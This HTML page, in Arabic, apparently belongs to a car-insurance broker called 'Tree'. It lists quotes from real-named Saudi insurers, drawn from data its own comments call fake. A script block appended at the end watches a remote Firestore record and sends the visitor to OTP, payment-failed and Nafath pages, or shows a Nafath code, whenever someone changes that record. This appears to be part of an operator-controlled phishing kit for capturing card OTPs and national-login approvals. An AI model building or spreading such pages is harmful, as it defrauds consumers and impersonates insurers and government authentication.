<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <title>عروض التأمين</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/site-theme.css">
    <style>
        .navbar { margin-bottom: 30px; }
        .nav-logo { height: 40px; }
        .form-wrapper { max-width: 800px; margin: 0 auto 40px; padding: 30px; border-radius: var(--tree-radius-lg); }
        .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; font-size: 0.9rem; }
        .step { text-align: center; flex: 1; position: relative; }
        .step.active { font-weight: bold; }
        .step-icon { width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; }
        .offer-card {
            padding: 20px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between;
            transition: transform 0.2s, box-shadow 0.2s; border-radius: var(--tree-radius);
        }
        .company-name { font-weight: bold; font-size: 1.2rem; margin-bottom: 5px; }
        .price-tag { font-size: 1.5rem; font-weight: bold; }
        .price-currency { font-size: 0.9rem; font-weight: normal; }
        .btn-select { padding: 8px 25px; border-radius: 10px; border: none; }
        .company-logo {
            width: 60px; height: 60px; object-fit: contain;
            margin-inline-start: 15px; border-radius: 8px;
            border: 1px solid var(--tree-border);
        }
        .site-footer { padding: 20px 0; margin-top: auto; text-align: center; font-size: 0.8rem; }
    </style>
</head>
<body class="tree-site page-offers">

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="wrapper">
    <!-- Navbar -->
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand" href="#"><img src="images/logo.png" class="nav-logo" alt="Tree"></a>
        </div>
    </nav>

<div class="container">
    <div class="form-wrapper">
        
        <!-- شريط الخطوات -->
        <div class="step-indicator">
            <div class="step active">
                <div class="step-icon">✔</div>
                <span>بيانات التأمين</span>
            </div>
            <div class="step active">
                <div class="step-icon">2</div>
                <span>قائمة الأسعار</span>
            </div>
            <div class="step">
                <div class="step-icon">3</div>
                <span>الملخص والدفع</span>
            </div>
        </div>

        <h2 class="text-center mb-4 fw-bold">اختر العرض الأنسب لك</h2>

        <!-- فلتر نوع التأمين -->
        <div class="d-flex justify-content-center mb-4">
            <div class="btn-group" role="group">
                <input type="radio" class="btn-check" name="typeFilter" id="tplFilter" autocomplete="off" checked onchange="startFilter('tpl')">
                <label class="btn btn-outline-success px-5 py-2 fw-bold" for="tplFilter">ضد الغير</label>

                <input type="radio" class="btn-check" name="typeFilter" id="compFilter" autocomplete="off" onchange="startFilter('comp')">
                <label class="btn btn-outline-success px-5 py-2 fw-bold" for="compFilter">شامل</label>
            </div>
        </div>

        <div id="loader" style="display: none;">
            <div class="spinner"></div>
            <p class="text-muted">جاري البحث عن أفضل العروض...</p>
        </div>

        <div id="offersList">
            <!-- سيتم تعبئة العروض هنا عبر الجافاسكربت -->
        </div>

    </div>
</div>

<!-- Footer -->
<footer class="site-footer">
    <div class="container"><p class="m-0">© 2024 تري لوساطة التأمين</p></div>
</footer>
</div>

<script>
    // بيانات العروض (وهمية للمحاكاة)
    const offersData = [
        { company: "ولاء للتأمين", logo: "images/companies/WALAA.png", tplPrice: 502, compPrice: 1850, rating: 4.5 },
        { company: "ميدغلف", logo: "images/companies/MEDGULF.png", tplPrice: 679, compPrice: 2100, rating: 4.0 },
        { company: "سلامة للتأمين", logo: "images/companies/SALAMA.png", tplPrice: 495, compPrice: 1750, rating: 3.8 },
        { company: "أسيج", logo: "images/companies/ACIG.png", tplPrice: 550, compPrice: 1900, rating: 4.2 },
        { company: "التعاونية", logo: "images/companies/TAWUNIYA.png", tplPrice: 850, compPrice: 2400, rating: 4.9 },
        { company: "ملاذ للتأمين", logo: "images/companies/MALATH.png", tplPrice: 620, compPrice: 2050, rating: 4.1 },
        { company: "تكافل الراجحي", logo: "images/companies/RAJHI.png", tplPrice: 590, compPrice: 1950, rating: 4.7 },
        { company: "الدرع العربي", logo: "images/companies/ARABIAN.png", tplPrice: 480, compPrice: 1700, rating: 3.9 },
        { company: "أليانز", logo: "images/companies/ALLIANZ.png", tplPrice: 710, compPrice: 2200, rating: 4.3 },
        { company: "الاتحاد للتأمين", logo: "images/companies/UNION.png", tplPrice: 530, compPrice: 1880, rating: 4.0 },
        { company: "جي آي جي (GIG)", logo: "images/companies/GIG.png", tplPrice: 750, compPrice: 2300, rating: 4.6 },
        { company: "أمانة للتأمين", logo: "images/companies/AMANA.png", tplPrice: 490, compPrice: 1720, rating: 3.7 },
        { company: "بروج للتأمين", logo: "images/companies/BURUJ.png", tplPrice: 510, compPrice: 1800, rating: 3.9 },
        { company: "الصقر للتأمين", logo: "images/companies/WALAA.png", tplPrice: 540, compPrice: 1860, rating: 3.8 },
        { company: "المتحدة للتأمين", logo: "images/companies/TAWUNIYA.png", tplPrice: 560, compPrice: 1920, rating: 4.1 },
        { company: "الخليجية العامة", logo: "images/companies/MEDGULF.png", tplPrice: 525, compPrice: 1840, rating: 3.8 },
        { company: "العالمية", logo: "images/companies/SALAMA.png", tplPrice: 580, compPrice: 1980, rating: 4.0 }
    ];

    const offersList = document.getElementById('offersList');
    const loader = document.getElementById('loader');

    function startFilter(type) {
        offersList.style.opacity = '0.5';
        loader.style.display = 'block';
        offersList.innerHTML = ''; // مسح مؤقت
        
        // محاكاة تأخير بسيط للواقعية
        setTimeout(() => {
            renderOffers(type);
            loader.style.display = 'none';
            offersList.style.opacity = '1';
        }, 800);
    }

    function renderOffers(type) {
        offersList.innerHTML = ""; // مسح القائمة الحالية
        
        // ترتيب العروض حسب السعر (من الأقل للأعلى)
        const sortedOffers = [...offersData].sort((a, b) => {
            return type === 'tpl' ? a.tplPrice - b.tplPrice : a.compPrice - b.compPrice;
        });

        sortedOffers.forEach(offer => {
            const price = type === 'tpl' ? offer.tplPrice : offer.compPrice;
            const typeText = type === 'tpl' ? "ضد الغير" : "شامل";
            const stars = "⭐".repeat(Math.floor(offer.rating));

            const card = document.createElement('div');
            card.className = 'offer-card';
            card.innerHTML = `
                <div class="d-flex align-items-center flex-grow-1">
                    <img src="${offer.logo}" alt="${offer.company}" class="company-logo" onerror="console.error('❌ صورة مفقودة: ${offer.logo}'); this.onerror=null; this.src='https://ui-avatars.com/api/?name='+this.alt+'&background=random&color=fff&size=128&font-size=0.4'">
                    <div>
                        <div class="company-name">${offer.company}</div>
                        <div class="text-warning small mb-1">${stars} (${offer.rating})</div>
                        <span class="badge-type">${typeText}</span>
                        
                        <div class="feature-list">
                            <div class="feature-item"><span class="text-success">✔</span> إصلاح ورش</div>
                            <div class="feature-item"><span class="text-success">✔</span> مساعدة على الطريق</div>
                            ${type === 'comp' ? '<div class="feature-item"><span class="text-success">✔</span> تغطية الزجاج</div>' : ''}
                        </div>
                    </div>
                </div>
                <div class="text-end ps-3 border-start">
                    <div class="price-tag">${price} <span class="price-currency">ريال</span></div>
                    <div class="text-muted small mb-2">شامل الضريبة</div>
                    <a href="policy_details.html?company=${encodeURIComponent(offer.company)}&price=${price}&type=${type}&logo=${encodeURIComponent(offer.logo)}" class="btn btn-select mt-2">اشتري الآن</a>
                </div>
            `;
            offersList.appendChild(card);
        });
    }

    // التشغيل الأولي (عرض ضد الغير افتراضياً)
    startFilter('tpl');
    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>

</body>
</html>
